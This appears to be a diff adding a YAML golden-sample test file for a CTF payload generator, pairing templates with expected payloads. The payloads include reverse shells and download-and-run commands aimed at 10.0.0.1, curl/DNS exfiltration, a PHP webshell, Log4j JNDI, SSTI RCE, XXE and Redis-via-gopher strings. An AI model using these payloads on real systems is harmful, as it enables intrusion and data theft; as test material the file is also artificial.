@@ -1,0 +1,549 @@
+# 第五轮扩充（SQLi 之外的各类型）的黄金样本。
+#
+# 两部分：
+#   1. 新模板的样本——覆盖这一轮补进来的 CTF 常考载荷
+#   2. **改了 body 的老模板的参数化样本**——证明新加的槽位真的在起作用。
+#      只跑默认值的话，「多了一个槽位但 body 没接上」这种错是看不出来的。
+#
+# 期望值全部照着 data/ 里的 body 手推，没有一条是跑工具粘回来的。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 参数化：老模板的新槽位 =================
+
+  - name: MySQL 读文件 · 回显位挪到第 2 位
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.file.read
+      slots: {cols: "3", pos: "2"}
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      # 以前 body 里写死 `load_file(...),2,3`，回显位只能是 1；现在由 <<select>> 生成
+      payload: "' UNION SELECT 1,load_file('/etc/passwd'),3 -- -"
+
+  - name: MySQL 读文件 · 五列取第 4 位
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.file.read
+      slots: {cols: "5", pos: "4"}
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3,load_file('/etc/passwd'),5 -- -"
+
+  - name: MySQL 登录绕过 · 闭合符为双引号加括号
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.auth.bypass
+      slots: {close: "\") "}
+      outputs: [raw]
+    expect:
+      payload: "\")  OR 1=1 -- -"
+
+  - name: MySQL 指定用户登录绕过 · 换用户名
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.auth.bypass.admin
+      slots: {username: root}
+      outputs: [raw]
+    expect:
+      payload: "root' -- -"
+
+  - name: 空字节截断 · 换穿越层级与假后缀
+    state:
+      vuln: traversal
+      template: traversal.generic.nullbyte
+      slots: {depth: "/../../../../../", fake: ".png"}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../../etc/passwd%00.png"
+
+  - name: 双重 URL 编码穿越 · 换层级
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.double
+      slots: {depth: "/%252e%252e/"}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "/%252e%252e/etc/passwd"
+
+  - name: Linux 空格用 $IFS 替代 · 目标改成 /flag
+    state:
+      vuln: rce
+      template: rce.linux.space.ifs
+      slots: {target: /flag}
+      outputs: [raw]
+    expect:
+      payload: ";cat$IFS/flag"
+
+  - name: Linux 带外回显 · 编码方式换成 hex
+    state:
+      vuln: rce
+      template: rce.linux.blind.oob
+      slots: {enc: "xxd -p | tr -d '\\n'"}
+      vars: {lhost: 10.0.0.1}
+      outputs: [raw]
+    expect:
+      # cmd 默认 whoami；$() 里的空格不在引号内，不触发提示
+      payload: ";curl http://10.0.0.1/$(whoami | xxd -p | tr -d '\\n')"
+      checks_count: 0
+
+  - name: 文件名路径穿越 · Web 根换成 CentOS
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      slots: {webroot: centos}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../usr/share/nginx/html/shell.php"
+
+  - name: PHP 一句话 · 函数换成 passthru
+    state:
+      vuln: upload
+      template: upload.generic.content.php
+      slots: {func: passthru}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<?php passthru('id'); ?>"
+
+  - name: XMLDecoder · 解释器换成 Windows
+    state:
+      vuln: deser
+      template: deser.java.xmldecoder.process
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+           <void index="0"><string>cmd.exe</string></void>
+           <void index="1"><string>/c</string></void>
+           <void index="2"><string>whoami</string></void>
+          </array>
+          <void method="start"/>
+         </object>
+        </java>
+      syntax: ok
+
+  - name: Razor 启动进程 · 解释器换成 Windows
+    state:
+      vuln: ssti
+      template: ssti.dotnet.razor.rce
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: "@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c whoami\"); }"
+
+  - name: LDAP 取反过滤器 · 换属性
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.not
+      slots: {attr: mail}
+      vars: {value: "a@b.c"}
+      outputs: [raw]
+    expect:
+      payload: ")(!(mail=a@b.c))(|(mail=*"
+
+  # ================= RCE =================
+
+  - name: Python 下载并执行
+    state:
+      vuln: rce
+      template: rce.linux.download.python
+      vars: {lhost: 10.0.0.1, file: a.py}
+      outputs: [raw]
+    expect:
+      payload: ";python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://10.0.0.1/a.py').read())\""
+
+  - name: Base64 编码执行
+    state:
+      vuln: rce
+      template: rce.linux.cmd.base64
+      vars: {b64: "aWQ="}
+      outputs: [raw]
+    expect:
+      payload: ";echo aWQ= | base64 -d | bash"
+
+  - name: Hex 编码执行
+    state:
+      vuln: rce
+      template: rce.linux.cmd.hex
+      vars: {hex: "6964"}
+      outputs: [raw]
+    expect:
+      payload: ";echo 6964 | xxd -r -p | bash"
+
+  - name: Linux 无回显写文件
+    state:
+      vuln: rce
+      template: rce.linux.blind.file
+      vars: {filepath: /var/www/html/o.txt}
+      outputs: [raw]
+    expect:
+      # cmd 走内置默认值 whoami
+      payload: ";whoami > /var/www/html/o.txt"
+
+  - name: Linux DNS 带外
+    state:
+      vuln: rce
+      template: rce.linux.blind.oob.dns
+      vars: {domain: d.example.com}
+      outputs: [raw]
+    expect:
+      payload: ";nslookup $(whoami | base64 -w0).d.example.com"
+
+  - name: 命名管道反弹 Shell
+    state:
+      vuln: rce
+      template: rce.linux.reverse.mkfifo
+      vars: {lhost: 10.0.0.1, lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"
+
+  - name: socat 反弹 Shell
+    state:
+      vuln: rce
+      template: rce.linux.reverse.socat
+      vars: {lhost: 10.0.0.1, lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";socat tcp-connect:10.0.0.1:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+
+  - name: bitsadmin 下载文件
+    state:
+      vuln: rce
+      template: rce.windows.download.bitsadmin
+      vars: {lhost: 10.0.0.1, file: a.exe}
+      outputs: [raw]
+    expect:
+      payload: "&bitsadmin /transfer j http://10.0.0.1/a.exe %TEMP%\\a.exe"
+
+  - name: PowerShell 编码命令
+    state:
+      vuln: rce
+      template: rce.windows.powershell.b64
+      vars: {b64: AAAA}
+      outputs: [raw]
+    expect:
+      payload: "&powershell -nop -w hidden -enc AAAA"
+
+  - name: Windows 时间盲注
+    state:
+      vuln: rce
+      template: rce.windows.blind.time
+      outputs: [raw]
+    expect:
+      payload: "&ping -n 5 127.0.0.1"
+
+  - name: PowerShell 读文件
+    state:
+      vuln: rce
+      template: rce.windows.powershell.file.read
+      vars: {filepath: C:/Windows/win.ini}
+      outputs: [raw]
+    expect:
+      # 变量落在模板的双引号字面量内，值里没有引号，不触发截断提示
+      payload: '&powershell -nop -c "Get-Content -Path ''C:/Windows/win.ini''"'
+      checks_count: 0
+
+  # ================= SSRF =================
+
+  - name: gopher 打 Redis · 探测
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_flushall%0D%0A"
+
+  - name: gopher 打 Redis · 定落点目录
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: dir_cron}
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/spool/cron/%0D%0A"
+
+  - name: SSRF DNS 重绑定
+    state:
+      vuln: ssrf
+      template: ssrf.generic.dns.rebind
+      vars: {sub: a, domain: rebind.example.com}
+      outputs: [raw]
+    expect:
+      payload: "http://a.rebind.example.com:80/"
+
+  # ================= SSTI =================
+
+  - name: Jinja2 枚举子类
+    state:
+      vuln: ssti
+      template: ssti.jinja2.detect.subclasses
+      outputs: [raw]
+    expect:
+      payload: "{{''.__class__.__mro__[1].__subclasses__()}}"
+      syntax: ok
+
+  - name: Jinja2 经 self 命令执行
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.self
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+      syntax: ok
+
+  - name: Jinja2 经 attr 过滤器（lipsum）
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.attr.lipsum
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"
+      syntax: ok
+
+  - name: Jinja2 命令走请求参数
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.request.args
+      outputs: [raw]
+    expect:
+      payload: "{{request.application.__globals__.__builtins__.__import__('os').popen(request.args.get('c')).read()}}"
+      syntax: ok
+
+  - name: Thymeleaf 预处理表达式
+    state:
+      vuln: ssti
+      template: ssti.java.thymeleaf.preprocess
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x"
+
+  - name: Twig 经 sort 过滤器
+    state:
+      vuln: ssti
+      template: ssti.php.twig.rce.sort
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{['id',0]|sort('system')|join}}"
+
+  - name: Smarty 版本指纹
+    state:
+      vuln: ssti
+      template: ssti.php.smarty.detect
+      outputs: [raw]
+    expect:
+      payload: "{$smarty.version}"
+
+  - name: Mako 读文件
+    state:
+      vuln: ssti
+      template: ssti.python.mako.file.read
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "${open('/etc/passwd').read()}"
+
+  - name: Slim 插值命令执行
+    state:
+      vuln: ssti
+      template: ssti.ruby.slim.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "#{`id`}"
+
+  # ================= 穿越 / 上传 / XPath =================
+
+  - name: Windows 绝对路径
+    state:
+      vuln: traversal
+      template: traversal.generic.windows.absolute
+      outputs: [raw]
+    expect:
+      payload: "C:/Windows/win.ini"
+
+  - name: 混合编码穿越
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.mixed
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "/..%2f..%2f..%2f/etc/passwd"
+
+  - name: .htaccess 内容
+    state:
+      vuln: upload
+      template: upload.generic.filename.htaccess.content
+      outputs: [raw]
+    expect:
+      payload: "AddType application/x-httpd-php .jpg"
+
+  - name: .user.ini 内容
+    state:
+      vuln: upload
+      template: upload.generic.filename.userini.content
+      vars: {file: shell.jpg}
+      outputs: [raw]
+    expect:
+      payload: "auto_prepend_file=shell.jpg"
+
+  - name: 少见可执行后缀
+    state:
+      vuln: upload
+      template: upload.generic.filename.rare_ext
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "shell.phtml"
+
+  - name: 后缀尾部技巧 · 空格
+    state:
+      vuln: upload
+      template: upload.generic.filename.trailing
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # 结尾那个空格是这个载荷的全部意义，别当成笔误删掉
+      payload: "shell.php "
+
+  - name: 后缀尾部技巧 · NTFS 数据流
+    state:
+      vuln: upload
+      template: upload.generic.filename.trailing
+      slots: {trick: ads}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "shell.php::$DATA"
+
+  - name: XPath 盲注探长度
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.length
+      vars: {n: "5"}
+      outputs: [raw]
+    expect:
+      payload: "' or string-length(//user[1]/password)=5 or '1'='2"
+
+  # ================= XXE =================
+
+  - name: XXE 经 php://filter 读文件
+    state:
+      vuln: xxe
+      template: xxe.generic.file.read.filter
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+        <foo>&xxe;</foo>
+      syntax: ok
+
+  - name: XXE 报错外带文件内容
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.error
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      # 参数实体引用写在内部子集的标记声明里，不符合 XML 规范（WFC）——
+      # 和 oob.exfil.inline 一样照常输出，只是运行期语法校验会报失败，这里不断言它
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % f SYSTEM "file:///etc/passwd">
+          <!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
+          %e;
+          %err;
+        ]>
+        <foo>ok</foo>
+
+  # ================= 反序列化 / NoSQL / LDAP =================
+
+  - name: XMLDecoder Runtime 执行命令
+    state:
+      vuln: deser
+      template: deser.java.xmldecoder.runtime
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <void class="java.lang.Runtime" method="getRuntime">
+          <object method="exec">
+           <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/sh</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>id</string></void>
+           </array>
+          </object>
+         </void>
+        </java>
+      syntax: ok
+
+  - name: Log4j lookup 混淆
+    state:
+      vuln: deser
+      template: deser.java.log4j.obfuscate
+      vars: {lhost: 10.0.0.1, lport: "1389", name: exp}
+      outputs: [raw]
+    expect:
+      payload: "${lower:j}ndi:${lower:l}dap://10.0.0.1:1389/exp"
+
+  - name: Log4j lookup 混淆 · ::- 空默认值
+    state:
+      vuln: deser
+      template: deser.java.log4j.obfuscate
+      slots: {style: dash}
+      vars: {lhost: 10.0.0.1, lport: "1389", name: exp}
+      outputs: [raw]
+    expect:
+      payload: "${${::-j}${::-n}${::-d}${::-i}:${${::-l}${::-d}${::-a}${::-p}}://10.0.0.1:1389/exp"
+
+  - name: MongoDB 登录绕过（$exists）
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.exists
+      outputs: [raw]
+    expect:
+      payload: "{\"username\":{\"$exists\":true},\"password\":{\"$exists\":true}}"
+
+  - name: MongoDB $where 正则盲注
+    state:
+      vuln: nosql
+      template: nosql.mongodb.blind.where
+      vars: {field: password, prefix: a}
+      outputs: [raw]
+    expect:
+      payload: "{\"$where\":\"this.password.match(/^a/)\"}"
+
+  - name: LDAP 盲注十六进制转义
+    state:
+      vuln: ldap
+      template: ldap.generic.blind.escape
+      vars: {hex: "61"}
+      outputs: [raw]
+    expect:
+      payload: "*)(uid=\\61*"
